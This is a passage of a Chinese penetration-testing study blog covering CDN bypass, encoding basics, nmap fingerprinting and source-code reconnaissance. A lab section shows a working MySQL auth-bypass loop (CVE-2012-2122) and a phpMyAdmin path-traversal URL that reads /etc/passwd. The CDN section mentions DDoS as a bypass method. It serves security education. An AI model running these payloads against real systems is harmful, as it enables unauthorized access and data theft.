      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。 <img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/CDN.png"></li></ul><h1 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务"></a>如何判断目标存在CDN服务</h1><ul><li>利用多节点技术进行请求返回判断</li><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20104946.png"></li><li>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN</li><li>没有使用CDN，例如<a href="http://www.xiaodi8.com/">www.xiaodi8.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105039.png"></li><li>使用了CDN，例如<a href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105112.png"></li></ul><h1 id="CDN对于安全测试有那些影响"><a href="#CDN对于安全测试有那些影响" class="headerlink" title="CDN对于安全测试有那些影响"></a>CDN对于安全测试有那些影响</h1><ul><li>cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</li></ul><h1 id="目前常见的CDN绕过技术有哪些"><a href="#目前常见的CDN绕过技术有哪些" class="headerlink" title="目前常见的CDN绕过技术有哪些"></a>目前常见的CDN绕过技术有哪些</h1><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><ul><li>因为有些网站为了节约成本，只为主站做了CDN服务，而子站没有，所以可以通过子站查询到IP地址</li></ul><h2 id="邮箱服务查询"><a href="#邮箱服务查询" class="headerlink" title="邮箱服务查询"></a>邮箱服务查询</h2><ul><li>很多公司都有内部邮箱，大部分都是内部人员访问，而且访问量不大，所以基本上都没有做CDN服务</li></ul><h2 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h2><ul><li>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</li></ul><h2 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h2><ul><li>如PHPinfo信息当中会遗留出ip地址</li></ul><h2 id="扫描全网"><a href="#扫描全网" class="headerlink" title="扫描全网"></a>扫描全网</h2><ul><li>从各个地区进行扫描IP，一般距离服务器近的不会使用CDN，即是真实IP</li></ul><h2 id="黑暗引擎搜索"><a href="#黑暗引擎搜索" class="headerlink" title="黑暗引擎搜索"></a>黑暗引擎搜索</h2><ul><li>fofa、傻蛋（shodan）、谛听、zoomeye、censys</li></ul><h2 id="特定文件dns历史记录"><a href="#特定文件dns历史记录" class="headerlink" title="特定文件dns历史记录"></a>特定文件dns历史记录</h2><ul><li>查看它没有使用CDN之前的IP地址记录，可能就是它的IP地址</li></ul><h2 id="以量打量"><a href="#以量打量" class="headerlink" title="以量打量"></a>以量打量</h2><ul><li>CDN节点的流量是有上限的，利用DDoS流量耗尽攻击，将流量耗尽就能直通原IP了</li><li>属于违法行为</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day06基础入门-加密算法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</li></ul><h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><h2 id="加密软件"><a href="#加密软件" class="headerlink" title="加密软件"></a>加密软件</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100158.png"></p><ul><li>解密网站<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100323.png"></li></ul><h2 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h2><ul><li>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</li><li>MD5等不可逆，这个网站不是通过常规枚举，而是通过已知</li></ul><h2 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h2><ul><li>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li></ul><h2 id="常见解密方式（针对"><a href="#常见解密方式（针对" class="headerlink" title="常见解密方式（针对)"></a>常见解密方式（针对)</h2><ul><li>枚举，自定义逆向算法，可逆向</li></ul><h2 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h2><ul><li>长度位数，字符规律，代码分析，搜索获取等</li></ul><h1 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h1><ul><li>时间戳网站&lt;<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101017.png"></li><li>时间戳通常是用在用户的注册、登录、注销等情况</li></ul><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><ul><li>url编码规则&lt;<a href="https://www.cnblogs.com/cxygg/p/9278542.html">https://www.cnblogs.com/cxygg/p/9278542.html</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101811.png"></li></ul><h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><ul><li>base64编码的特点：随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号</li><li>一般在代码中为了安全会使用base64进行编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102002.png"></li></ul><h1 id="unescape编码"><a href="#unescape编码" class="headerlink" title="unescape编码"></a>unescape编码</h1><ul><li>和URL编码有点像</li><li>特点：一般是%U+四个数字对应着两个字符、主要运用于网站web应用<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102141.png"></li></ul><h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><ul><li>AES在逐渐的取代md5值、在解密的过程中一定要知道密码和偏移量不然是借不出来的。</li><li>在线工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102645.png"></li><li>密码是干扰项，会加入到文本当中，偏移量是加密的起始点</li><li>看起来是base64，但是对base64解密得到的是乱码</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day05基础入门-系统及数据库等</title>
      <link href="/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/"/>
      <url>/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p>除去前期讲到过的搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库，第三方平台等，期中这类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93.png"></p><h1 id="操作系统层面："><a href="#操作系统层面：" class="headerlink" title="操作系统层面："></a>操作系统层面：</h1><h2 id="识别操作系统的常见方法"><a href="#识别操作系统的常见方法" class="headerlink" title="识别操作系统的常见方法"></a>识别操作系统的常见方法</h2><h3 id="有网站"><a href="#有网站" class="headerlink" title="有网站"></a>有网站</h3><ul><li>可以通过网站的手工识别方法判断：</li><li>windows对大小写不敏感，也就是说你在网页中可以替换网站路径的大小写进行测试，如果改变大小写不会影响则可能是Windows的服务器，有影响则可能是Linux。</li></ul><h3 id="没网站"><a href="#没网站" class="headerlink" title="没网站"></a>没网站</h3><ul><li>通过nmap进行扫描：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20141011.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Running (JUST GUESSING): Microsoft Windows 7|2008|Vista|8.1|2012 (96%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2012:r2</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 SP1 (96%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)</span><br></pre></td></tr></table></figure></li><li>对服务器系统进行了识别，这个判断应该为<code>Microsoft Windows 7 SP1</code></li><li>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># nmap -O 10.1.1.129</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.1.1.129 (10.1.1.129)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">MAC Address: 00:0C:29:DC:AF:EA (VMware)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=6/7%OT=80%CT=1%CU=36041%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM</span><br><span class="line">OS:=60BE1ADE%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%</span><br><span class="line">OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5</span><br><span class="line">OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)</span><br><span class="line">OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%</span><br><span class="line">OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=</span><br><span class="line">OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=</span><br><span class="line">OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=80%CD=Z)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也<strong>不一定准确</strong>。下面是默认操作系统的TTL：</p><ol><li>WINDOWS NT&#x2F;2000   TTL：128</li><li>WINDOWS 95&#x2F;98     TTL：32</li><li>UNIX              TTL：255</li><li>LINUX             TTL：64</li><li>WIN7           TTL：64<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20143750.png"></li></ol><ul><li>这个TTL&#x3D;110，接近与128，属于Windows NT&#x2F;2000</li></ul><h2 id="简要两者的区别及识别意义"><a href="#简要两者的区别及识别意义" class="headerlink" title="简要两者的区别及识别意义"></a>简要两者的区别及识别意义</h2><ul><li>系统文件的路径不同，Windows是分C盘、D盘等，而Linux的盘储存就不一样，等等。</li><li>已知服务器的操作系统是什么，就可以对症下药有针对性地围绕这个操作系统所支持地方面去发展。</li></ul><h2 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h2><ul><li>有些漏洞对于我们来说是没有意义的，只是会造成一些危害，但不会造成权限的丢失，只是影响了产品，没有获取到权限那就没太大意义。</li><li>不同的漏洞会造成不同漏洞利用的条件</li></ul><h2 id="简要操作系统层面漏洞影响范围"><a href="#简要操作系统层面漏洞影响范围" class="headerlink" title="简要操作系统层面漏洞影响范围"></a>简要操作系统层面漏洞影响范围</h2><ul><li>有些漏洞会对操作系统干扰造成崩溃、而有些系统只是蓝屏、或者是权限的提升</li></ul><h1 id="数据库层面："><a href="#数据库层面：" class="headerlink" title="数据库层面："></a>数据库层面：</h1><ul><li>网站分动态网站和静态网站，静态网站由于只是单页，没有数据传递，所以不存在数据库漏洞。</li></ul><h2 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h2><ul><li>默认的语言搭配的数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 组合类型asp + access/mssql</span><br><span class="line">2. 组合类型php + mysql </span><br><span class="line">3. 组合类型aspx+mssql</span><br><span class="line">4. 组合类型jsp +mysql/oracle</span><br><span class="line">5. 组合类型Python + MongoDB</span><br></pre></td></tr></table></figure></li><li>常见的数据库默认端口号</li><li>关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql3306</span><br><span class="line">2. sqlserver1433</span><br><span class="line">3. oracle1521</span><br><span class="line">4. psotgresql5432</span><br></pre></td></tr></table></figure></li><li>非关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. MongoDB27017</span><br><span class="line">2. Redis6379</span><br><span class="line">3. memcached11211</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20145520.png"></li><li>3306端口为MySQL数据库</li><li>其中STATE状态，open表示打开，close是关闭，filtered是拦截，表示nmap无法确定开放状态</li></ul><h2 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h2><ul><li>数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。</li><li>不同的数据库的攻击方式也不完全一样。</li></ul><h2 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h2><ul><li>存在弱口令</li><li>数据库漏洞</li></ul><h2 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h2><ul><li>数据库权限</li><li>网站权限</li><li>修改网页内容</li></ul><h1 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h1><h2 id="如何判断有哪些第三方平台或软件"><a href="#如何判断有哪些第三方平台或软件" class="headerlink" title="如何判断有哪些第三方平台或软件"></a>如何判断有哪些第三方平台或软件</h2><ul><li>通过扫描网站可以看到安装了哪些第三方的软件，例如下面这个就是安装了Apache httpd<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20151155.png"></li></ul><h2 id="简要为什么要识别第三方平台或软件"><a href="#简要为什么要识别第三方平台或软件" class="headerlink" title="简要为什么要识别第三方平台或软件"></a>简要为什么要识别第三方平台或软件</h2><ul><li>不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多</li></ul><h2 id="常见第三方平台或软件漏洞类型及攻击"><a href="#常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="常见第三方平台或软件漏洞类型及攻击"></a>常见第三方平台或软件漏洞类型及攻击</h2><ul><li>弱口令</li><li>软件的漏洞攻击</li></ul><h2 id="简要第三方平台或软件安全测试的范围"><a href="#简要第三方平台或软件安全测试的范围" class="headerlink" title="简要第三方平台或软件安全测试的范围"></a>简要第三方平台或软件安全测试的范围</h2><ul><li>直接获取到软件的权限便于进一步的提权和攻击</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。<strong>所以明确安全测试思路是很重要的！</strong></li><li>要根据它上面提供的服务来选取这个常见的攻击漏洞或者攻击方式</li></ul><h1 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h1><h2 id="演示某数据库弱口令及漏洞演示"><a href="#演示某数据库弱口令及漏洞演示" class="headerlink" title="演示某数据库弱口令及漏洞演示"></a>演示某数据库弱口令及漏洞演示</h2><h3 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h3><ul><li><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a></li><li>首先在Ubuntu搭建漏洞环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164727.png"></li><li>在kali当中对这个数据库进行扫描<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164829.png"></li><li>可以看出MySQL版本为5.5.23，存在这个漏洞<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 1000`; <span class="keyword">do</span> mysql -u root --password=bad -h 192.168.3.39 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li><li>就可以直接进入到MySQL的shell<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20165219.png"></li></ul><h2 id="第三方应用安全漏洞演示"><a href="#第三方应用安全漏洞演示" class="headerlink" title="第三方应用安全漏洞演示"></a>第三方应用安全漏洞演示</h2><h3 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h3><ul><li><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a></li><li>搭建环境</li><li>然后访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20171122.png"></li><li>可见<code>/etc/passwd</code>被读取，说明文件包含漏洞存在</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day04基础入门-WEB源码拓展</title>
      <link href="/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB源码拓展"><a href="#WEB源码拓展" class="headerlink" title="WEB源码拓展"></a>WEB源码拓展</h1><ul><li>WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-31%20142321.png"></li><li>数据库配置文件，后台目录，模版目录，数据库目录等</li><li>ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题，不同的脚本写出来的数据库储存是不一样的，不同脚本所设置的安全漏洞也是不一样的。</li><li>源码功能决定漏洞的类型，社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞，例如电商主要是支付交易内容，论坛主要是用户信息，可以针对这些内容做文章。</li><li>框架就是将一些常用的功能集成到一个框架内，在开发时直接引用。如果时通过框架开发的，我们可以直接寻找框架的漏洞，如果时非框架的话，就需要在代码当中寻找漏洞。</li><li>CMS称为开源程序，CMS的意义就是如果你在网上找不到这个漏洞，你就自己分析，但是网络上如果找得到，就可以直接使用别人分析的漏洞进行测试。</li><li>能够CMS识别的成为开源，网络上找不到源码的通常成为内部的。开源的网站可以在网络上查找他人分析的漏洞，也可以自己分析；内部的则需要自己分析，通过扫描工具等进行分析。</li><li>关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</li><li>总结:关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外，只需要找这个框架的漏洞就可以了），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取!</li><li><a href="https://websec.readthedocs.io/zh/latest/">WEB安全学习笔记</a></li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day03基础入门-搭建安全拓展</title>
      <link href="/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h1><h2 id="常见搭建平台脚本"><a href="#常见搭建平台脚本" class="headerlink" title="常见搭建平台脚本"></a>常见搭建平台脚本</h2><ul><li><code>ASP</code>、<code>PHP</code>、<code>ASPX</code>、<code>JSP</code>、<code>PY</code>、<code>JAVAWEB</code>等环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20194303.png" alt="Windows Server2003 IIS"></li></ul><h2 id="域名IP目录解析安全问题"><a href="#域名IP目录解析安全问题" class="headerlink" title="域名IP目录解析安全问题"></a>域名IP目录解析安全问题</h2><p>通过域名访问，直接进入到网站绝对目录内，通过IP访问，则可能进入到上一级目录，存在安全问题。</p><h2 id="常见文件后缀解析对应安全"><a href="#常见文件后缀解析对应安全" class="headerlink" title="常见文件后缀解析对应安全"></a>常见文件后缀解析对应安全</h2><p><img 